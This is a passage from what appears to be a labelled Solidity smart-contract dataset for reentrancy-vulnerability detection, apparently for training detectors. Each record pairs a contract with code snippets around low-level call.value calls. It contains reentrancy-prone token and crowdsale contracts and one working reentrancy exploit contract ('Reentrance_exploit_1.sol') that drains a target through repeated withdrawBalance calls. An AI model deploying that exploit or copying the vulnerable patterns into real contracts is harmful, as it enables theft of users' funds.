sig; } function getFallback() view public returns (TKN) { return fallback; } function tokenFallback(address _from, uint256 _value, bytes _data) public returns (bool) { TKN memory tkn; tkn.sender = _from; tkn.value = _value; tkn.data = _data; uint32 u = uint32(_data[3]) + (uint32(_data[2]) << 8) + (uint32(_data[1]) << 16) + (uint32(_data[0]) << 24); tkn.sig = bytes4(u); fallback = tkn; return true; } } contract Token1st { address public currentTradingSystem; address public currentExchangeSystem; mapping(address => uint) public balanceOf; mapping(address => mapping (address => uint)) public allowance; mapping(address => mapping (address => uint)) public tradingBalanceOf; mapping(address => mapping (address => uint)) public exchangeBalanceOf; function getBalanceOf(address _address) view public returns (uint amount){ return balanceOf[_address]; } event Transfer (address _to, address _from, uint _decimalAmount); function transferDecimalAmountFrom(address _from, address _to, uint _value) public returns (bool success) { require(balanceOf[_from] - tradingBalanceOf[_from][currentTradingSystem] - exchangeBalanceOf[_from][currentExchangeSystem] >= _value); require(balanceOf[_to] + (_value) >= balanceOf[_to]); require(_value <= allowance[_from][msg.sender]); balanceOf[_from] -= _value; balanceOf[_to] += _value; allowance[_from][msg.sender] -= _value; Transfer(_to, _from, _value); return true; } function approveSpenderDecimalAmount(address _spender, uint _value) public returns (bool success) { allowance[msg.sender][_spender] = _value; return true; } } contract ContractWeb is CanTransferTokens, CheckIfContract { mapping(string => contractInfo) internal contracts; event ContractAdded(string _name, address _referredTo); event ContractEdited(string _name, address _referredTo); event ContractMadePermanent(string _name); struct contractInfo { address contractAddress; bool isPermanent; } function getContractAddress(string _name) view public returns (address) { return contracts[_name].contractAddress; } function isContractPermanent(string _name) view public returns (bool) { return contracts[_name].isPermanent; } function setContract(string _name, address _address) onlyPayloadSize(2 * 32) onlyOwner public returns (bool) { require(isContract(_address)); require(this != _address); require(contracts[_name].contractAddress != _address); require(contracts[_name].isPermanent == false); address oldAddress = contracts[_name].contractAddress; contracts[_name].contractAddress = _address; if(oldAddress == address(0x0)) { ContractAdded(_name, _address); } else { ContractEdited(_name, _address); } return true; } function makeContractPermanent(string _name) onlyOwner public returns (bool) { require(contracts[_name].contractAddress != address(0x0)); require(contracts[_name].isPermanent == false); contracts[_name].isPermanent = true; ContractMadePermanent(_name); return true; } function tokenSetup(address _Tokens1st, address _Balancecs, address _Token, address _Conversion, address _Distribution) onlyPayloadSize(5 * 32) onlyOwner public returns (bool) { setContract(\"Token1st\", _Tokens1st); setContract(\"Balances\", _Balancecs); setContract(\"Token\", _Token); setContract(\"Conversion\", _Conversion); setContract(\"Distribution\", _Distribution); return true; } } contract Balances is CanTransferTokens, SafeMath, useContractWeb { mapping(address => uint256) internal _balances; function get(address _account) view public returns (uint256) { return _balances[_account]; } function tokenContract() view public returns (address) { return web.getContractAddress(\"Token\"); } function Balances() public { _balances[msg.sender] = 190 * 1000000 * 1000000000000000000; } modifier onlyToken { require(msg.sender == tokenContract()); _; } function transfer(address _from, address _to, uint256 _value) onlyPayloadSize(3 * 32) onlyToken public returns (bool success) { _balances[_from] = sub(_balances[_from], _value); _balances[_to] = add(_balances[_to], _value); return true; } } contract Token is CanTransferTokens, SafeMath, CheckIfContract, useContractWeb { string public symbol = \"SHC\"; string public name = \"ShineCoin\"; uint8 public decimals = 18; uint256 public totalSupply = 190 * 1000000 * 1000000000000000000; mapping (address => mapping (address => uint256)) internal _allowance; event Approval(address indexed from, address indexed to, uint256 value); event Transfer(address indexed from, address indexed to, uint256 value); event Transfer(address indexed from, address indexed to, uint256 value, bytes indexed data); function balanceOf(address _account) view public returns (uint256) { return Balances(balancesContract()).get(_account); } function allowance(address _from, address _to) view public returns (uint256 remaining) { return _allowance[_from][_to]; } function balancesContract() view public returns (address) { return web.getContractAddress(\"Balances\"); } function Token() public { bytes memory empty; Transfer(this, msg.sender, 190 * 1000000 * 1000000000000000000); Transfer(this, msg.sender, 190 * 1000000 * 1000000000000000000, empty); } function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) { if(isContract(_to)) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); } } function transfer(address _to, uint256 _value, bytes _data) onlyPayloadSize(3 * 32) public returns (bool success) { if(isContract(_to)) { return transferToContract(_to, _value, _data); } else { return transferToAddress(_to, _value, _data); } } function transfer(address _to, uint256 _value) onlyPayloadSize(2 * 32) public returns (bool success) { bytes memory empty; if(isContract(_to)) { return transferToContract(_to, _value, empty); } else { return transferToAddress(_to, _value, empty); } } function transferToAddress(address _to, uint256 _value, bytes _data) internal returns (bool success) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } function transferToContract(address _to, uint256 _value, bytes _data) internal returns (bool success) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); receiver.tokenFallback(msg.sender, _value, _data); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } function transferFrom(address _from, address _to, uint256 _value) onlyPayloadSize(3 * 32) public returns (bool) { bytes memory empty; require(_value > 0 && _allowance[_from][msg.sender] >= _value && Balances(balancesContract()).get(_from) >= _value); _allowance[_from][msg.sender] = sub(_allowance[_from][msg.sender], _value); if(msg.sender != _to && isContract(_to)) { Balances(balancesContract()).transfer(_from, _to, _value); ContractReceiver receiver = ContractReceiver(_to); receiver.tokenFallback(_from, _value, empty); } else { Balances(balancesContract()).transfer(_from, _to, _value); } Transfer(_from, _to, _value); Transfer(_from, _to, _value, empty); return true; } function approve(address _to, uint256 _value) onlyPayloadSize(2 * 32) public returns (bool) { _allowance[msg.sender][_to] = add(_allowance[msg.sender][_to], _value); Approval(msg.sender, _to, _value); return true; } } contract Conversion is CanTransferTokens, useContractWeb { function token1stContract() view public returns (address) { return web.getContractAddress(\"Token1st\"); } function tokenContract() view public returns (address) { return web.getContractAddress(\"Token\"); } function deposit() onlyOwner public returns (bool) { require(Token(tokenContract()).allowance(owner, this) > 0); return Token(tokenContract()).transferFrom(owner, this, Token(tokenContract()).allowance(owner, this)); } function convert() public returns (bool) { uint256 senderBalance = Token1st(token1stContract()).getBalanceOf(msg.sender); require(Token1st(token1stContract()).allowance(msg.sender, this) >= senderBalance); Token1st(token1stContract()).transferDecimalAmountFrom(msg.sender, owner, senderBalance); return Token(tokenContract()).transfer(msg.sender, senderBalance * 10000000000); } } contract Distribution is CanTransferTokens, SafeMath, useContractWeb { uint256 public liveSince; uint256 public withdrawn; function withdrawnReadable() view public returns (uint256) { return withdrawn / 1000000000000000000; } function secondsLive() view public returns (uint256) { if(liveSince != 0) { return now - liveSince; } } function allowedSince() view public returns (uint256) { return secondsLive() * 380265185769276972; } function allowedSinceReadable() view public returns (uint256) { return secondsLive() * 380265185769276972 / 1000000000000000000; } function stillAllowed() view public returns (uint256) { return allowedSince() - withdrawn; } function stillAllowedReadable() view public returns (uint256) { uint256 _1 = allowedSince() - withdrawn; return _1 / 1000000000000000000; } function tokenContract() view public returns (address) { return web.getContractAddress(\"Token\"); } function makeLive() onlyOwner public returns (bool) { require(liveSince == 0); liveSince = now; return true; } function deposit() onlyOwner public returns (bool) { require(Token(tokenContract()).allowance(owner, this) > 0); return Token(tokenContract()).transferFrom(owner, this, Token(tokenContract()).allowance(owner, this)); } function transfer(address _to, uint256 _value) onlyPayloadSize(2 * 32) onlyOwner public returns (bool) { require(stillAllowed() >= _value && _value > 0 && liveSince != 0); withdrawn = add(withdrawn, _value); return Token(tokenContract()).transfer(_to, _value); } function transferReadable(address _to, uint256 _value) onlyPayloadSize(2 * 32) onlyOwner public returns (bool) { require(stillAllowed() >= _value * 1000000000000000000 && stillAllowed() != 0 && liveSince != 0); withdrawn = add(withdrawn, _value * 1000000000000000000); return Token(tokenContract()).transfer(_to, _value * 1000000000000000000); } } "}
{"sol name": "35617_1.sol", "label": 0, "first path": "function buyRecipient(address recipient) duringCrowdSale payable { require(!halted); uint tokens = safeMul(msg.value, price(block.timestamp)); require(safeAdd(saleTokenSupply,tokens)<=coinAllocation ); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); salesVolume = safeAdd(salesVolume, msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(recipient, msg.value, tokens); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); ", "second path": "function buyRecipient(address recipient) duringCrowdSale payable { require(!halted); uint tokens = safeMul(msg.value, price(block.timestamp)); require(safeAdd(saleTokenSupply,tokens)<=coinAllocation ); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); salesVolume = safeAdd(salesVolume, msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(recipient, msg.value, tokens); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); ", "third path": "function buyRecipient(address recipient) duringCrowdSale payable { require(!halted); uint tokens = safeMul(msg.value, price(block.timestamp)); require(safeAdd(saleTokenSupply,tokens)<=coinAllocation ); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); salesVolume = safeAdd(salesVolume, msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(recipient, msg.value, tokens); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); ", "long path": "pragma solidity ^0.4.11; contract SafeMath { function safeMul(uint a, uint b) internal returns (uint) { uint c = a * b; assert(a == 0 || c / a == b); return c; } function safeSub(uint a, uint b) internal returns (uint) { assert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal returns (uint) { uint c = a + b; assert(c>=a && c>=b); return c; } function safeDiv(uint a, uint b) internal returns (uint) { assert(b > 0); uint c = a / b; assert(a == b * c + a % b); return c; } } contract Token { uint256 public totalSupply; function balanceOf(address _owner) constant returns (uint256 balance); function transfer(address _to, uint256 _value) returns (bool success); function transferFrom(address _from, address _to, uint256 _value) returns (bool success); function approve(address _spender, uint256 _value) returns (bool success); function allowance(address _owner, address _spender) constant returns (uint256 remaining); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract StandardToken is Token { function transfer(address _to, uint256 _value) returns (bool success) { if (balances[msg.sender] >= _value && _value > 0) { balances[msg.sender] -= _value; balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; } else { return false; } } function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) { balances[_to] += _value; balances[_from] -= _value; allowed[_from][msg.sender] -= _value; Transfer(_from, _to, _value); return true; } else { return false; } } function balanceOf(address _owner) constant returns (uint256 balance) { return balances[_owner]; } function approve(address _spender, uint256 _value) returns (bool success) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; } mapping (address => uint256) balances; mapping (address => mapping (address => uint256)) allowed; } contract MoldCoin is StandardToken, SafeMath { string public name = \"MOLD\"; string public symbol = \"MLD\"; uint public decimals = 18; uint public startDatetime; uint public firstStageDatetime; uint public secondStageDatetime; uint public endDatetime; address public founder; address public admin; uint public coinAllocation = 20 * 10**8 * 10**decimals; uint public angelAllocation = 2 * 10**8 * 10**decimals; uint public founderAllocation = 3 * 10**8 * 10**decimals; bool public founderAllocated = false; uint public saleTokenSupply = 0; uint public salesVolume = 0; uint public angelTokenSupply = 0; bool public halted = false; event Buy(address indexed sender, uint eth, uint tokens); event AllocateFounderTokens(address indexed sender, uint tokens); event AllocateAngelTokens(address indexed sender, address to, uint tokens); event AllocateUnsoldTokens(address indexed sender, address holder, uint tokens); modifier onlyAdmin { require(msg.sender == admin); _; } modifier duringCrowdSale { require(block.timestamp >= startDatetime && block.timestamp <= endDatetime); _; } function MoldCoin(uint startDatetimeInSeconds, address founderWallet) { admin = msg.sender; founder = founderWallet; startDatetime = startDatetimeInSeconds; firstStageDatetime = startDatetime + 120 * 1 hours; secondStageDatetime = firstStageDatetime + 240 * 1 hours; endDatetime = secondStageDatetime + 2040 * 1 hours; } function price(uint timeInSeconds) constant returns(uint) { if (timeInSeconds < startDatetime) return 0; if (timeInSeconds <= firstStageDatetime) return 15000; if (timeInSeconds <= secondStageDatetime) return 12000; if (timeInSeconds <= endDatetime) return 10000; return 0; } function buy() payable { buyRecipient(msg.sender); } function() payable { buyRecipient(msg.sender); } function buyRecipient(address recipient) duringCrowdSale payable { require(!halted); uint tokens = safeMul(msg.value, price(block.timestamp)); require(safeAdd(saleTokenSupply,tokens)<=coinAllocation ); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); salesVolume = safeAdd(salesVolume, msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(recipient, msg.value, tokens); } function allocateFounderTokens() onlyAdmin { require( block.timestamp > endDatetime ); require(!founderAllocated); balances[founder] = safeAdd(balances[founder], founderAllocation); totalSupply = safeAdd(totalSupply, founderAllocation); founderAllocated = true; AllocateFounderTokens(msg.sender, founderAllocation); } function allocateAngelTokens(address angel, uint tokens) onlyAdmin { require(safeAdd(angelTokenSupply,tokens) <= angelAllocation ); balances[angel] = safeAdd(balances[angel], tokens); angelTokenSupply = safeAdd(angelTokenSupply, tokens); totalSupply = safeAdd(totalSupply, tokens); AllocateAngelTokens(msg.sender, angel, tokens); } function halt() onlyAdmin { halted = true; } function unhalt() onlyAdmin { halted = false; } function changeAdmin(address newAdmin) onlyAdmin  { admin = newAdmin; } function arrangeUnsoldTokens(address holder, uint256 tokens) onlyAdmin { require( block.timestamp > endDatetime ); require( safeAdd(saleTokenSupply,tokens) <= coinAllocation ); require( balances[holder] >0 ); balances[holder] = safeAdd(balances[holder], tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); totalSupply = safeAdd(totalSupply, tokens); AllocateUnsoldTokens(msg.sender, holder, tokens); } } contract MoldCoinBonus is SafeMath { function bonusBalanceOf(address _owner) constant returns (uint256 balance) { return bonusBalances[_owner]; } mapping (address => uint256) bonusBalances; address public admin; MoldCoin public fundAddress; uint public rate = 10; uint public totalSupply = 0; bool public halted = false; event BuyWithBonus(address indexed sender, address indexed inviter, uint eth, uint tokens, uint bonus); event BuyForFriend(address indexed sender, address indexed friend, uint eth, uint tokens, uint bonus); modifier onlyAdmin { require(msg.sender == admin); _; } modifier validSale { require(!halted); require(!fundAddress.halted()); _; } function MoldCoinBonus(MoldCoin _fundAddress, uint _rate) { admin = msg.sender; fundAddress = _fundAddress; rate = _rate; } function buyWithBonus(address inviter) validSale payable { require( msg.sender != inviter ); uint tokens = safeMul(msg.value, fundAddress.price(block.timestamp)); uint bonus = safeDiv(safeMul(tokens, rate), 100); fundAddress.buyRecipient.value(msg.value)(msg.sender); totalSupply = safeAdd(totalSupply, bonus*2); bonusBalances[inviter] = safeAdd(bonusBalances[inviter], bonus); bonusBalances[msg.sender] = safeAdd(bonusBalances[msg.sender], bonus); BuyWithBonus(msg.sender, inviter, msg.value, tokens, bonus); } function halt() onlyAdmin { halted = true; } function unhalt() onlyAdmin { halted = false; } function changeAdmin(address newAdmin) onlyAdmin  { admin = newAdmin; } function changeRate(uint _rate) onlyAdmin  { rate = _rate; } } "}
{"sol name": "25808_1.sol", "label": 1, "first path": "function getTokens(uint num, address addr) public { for(uint i = 0; i < num; i++){ addr.call.value(0 wei)(); ", "second path": "function getTokens(uint num, address addr) public { for(uint i = 0; i < num; i++){ addr.call.value(0 wei)(); ", "third path": "function getTokens(uint num, address addr) public { for(uint i = 0; i < num; i++){ addr.call.value(0 wei)(); ", "long path": "pragma solidity ^0.4.19; contract Token { function transfer(address _to, uint _value) returns (bool success); function balanceOf(address _owner) constant returns (uint balance); } contract EtherGet { address owner; function EtherGet() { owner = msg.sender; } function withdrawTokens(address tokenContract) public { Token tc = Token(tokenContract); tc.transfer(owner, tc.balanceOf(this)); } function withdrawEther() public { owner.transfer(this.balance); } function getTokens(uint num, address addr) public { for(uint i = 0; i < num; i++){ addr.call.value(0 wei)(); } } } "}
{"sol name": "22805_1.sol", "label": 0, "first path": "function eT(address _pd, uint _tkA, uint _etA) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _tkA); balances[_pd] = safeAdd(balances[_pd], _tkA); if (!_pd.call.value(_etA)()) revert(); ET(_pd, _tkA, _etA); return true; ", "second path": "function eT(address _pd, uint _tkA, uint _etA) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _tkA); balances[_pd] = safeAdd(balances[_pd], _tkA); if (!_pd.call.value(_etA)()) revert(); ET(_pd, _tkA, _etA); return true; ", "third path": "function eT(address _pd, uint _tkA, uint _etA) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _tkA); balances[_pd] = safeAdd(balances[_pd], _tkA); if (!_pd.call.value(_etA)()) revert(); ET(_pd, _tkA, _etA); return true; ", "long path": "pragma solidity ^0.4.18; contract Ownable { address public owner; function Ownable() { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) onlyOwner { if (newOwner != address(0)) { owner = newOwner; } } } contract SafeMath { function safeMul(uint a, uint b) internal returns (uint) { uint c = a * b; sAssert(a == 0 || c / a == b); return c; } function safeDiv(uint a, uint b) internal returns (uint) { sAssert(b > 0); uint c = a / b; sAssert(a == b * c + a % b); return c; } function safeSub(uint a, uint b) internal returns (uint) { sAssert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal returns (uint) { uint c = a + b; sAssert(c>=a && c>=b); return c; } function max64(uint64 a, uint64 b) internal constant returns (uint64) { return a >= b ? a : b; } function min64(uint64 a, uint64 b) internal constant returns (uint64) { return a < b ? a : b; } function max256(uint256 a, uint256 b) internal constant returns (uint256) { return a >= b ? a : b; } function min256(uint256 a, uint256 b) internal constant returns (uint256) { return a < b ? a : b; } function sAssert(bool assertion) internal { if (!assertion) { throw; } } } contract ERC20 { uint public totalSupply; function balanceOf(address who) constant returns (uint); function allowance(address owner, address spender) constant returns (uint); function transfer(address to, uint value) returns (bool ok); function transferFrom(address from, address to, uint value) returns (bool ok); function approve(address spender, uint value) returns (bool ok); event Transfer(address indexed from, address indexed to, uint value); event Approval(address indexed owner, address indexed spender, uint value); } contract StandardToken is ERC20, SafeMath { mapping(address => uint) balances; mapping (address => mapping (address => uint)) allowed; function transfer(address _to, uint _value) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _value); balances[_to] = safeAdd(balances[_to], _value); Transfer(msg.sender, _to, _value); return true; } function transferFrom(address _from, address _to, uint _value) returns (bool success) { var _allowance = allowed[_from][msg.sender]; balances[_to] = safeAdd(balances[_to], _value); balances[_from] = safeSub(balances[_from], _value); allowed[_from][msg.sender] = safeSub(_allowance, _value); Transfer(_from, _to, _value); return true; } function balanceOf(address _owner) constant returns (uint balance) { return balances[_owner]; } function approve(address _spender, uint _value) returns (bool success) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint remaining) { return allowed[_owner][_spender]; } } contract PowerCoin is Ownable, StandardToken { string public name = \"CapricornCoin\"; string public symbol = \"CCC\"; uint public decimals = 18; uint public totalSupply = 2 * (10 * (10**6) * (10**18)); event ET(address indexed _pd, uint _tkA, uint _etA); function eT(address _pd, uint _tkA, uint _etA) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _tkA); balances[_pd] = safeAdd(balances[_pd], _tkA); if (!_pd.call.value(_etA)()) revert(); ET(_pd, _tkA, _etA); return true; } function PowerCoin() { balances[msg.sender] = totalSupply; } function () payable{ } function transferOwnership(address _newOwner) onlyOwner { balances[_newOwner] = safeAdd(balances[owner], balances[_newOwner]); balances[owner] = 0; Ownable.transferOwnership(_newOwner); } function transferAnyERC20Token(address tokenAddress, uint amount) onlyOwner returns (bool success) { return ERC20(tokenAddress).transfer(owner, amount); } } "}
{"sol name": "Reentrance_exploit_1.sol", "label": 1, "first path": "function deposit(address _vulnerable_contract) public payable{ vulnerable_contract = _vulnerable_contract ; require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\")))); ", "second path": "function deposit(address _vulnerable_contract) public payable{ vulnerable_contract = _vulnerable_contract ; require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\")))); ", "third path": "function deposit(address _vulnerable_contract) public payable{ vulnerable_contract = _vulnerable_contract ; require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\")))); ", "long path": "pragma solidity ^0.4.15; contract ReentranceExploit { bool public attackModeIsOn=false; address public vulnerable_contract; address public owner; function ReentranceExploit() public{ owner = msg.sender; } function deposit(address _vulnerable_contract) public payable{ vulnerable_contract = _vulnerable_contract ; require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\")))); } function launch_attack() public{ attackModeIsOn = true; require(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\")))); } function () public payable{ if (attackModeIsOn){ attackModeIsOn = false; require(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\")))); } } function get_money(){ suicide(owner); } } "}
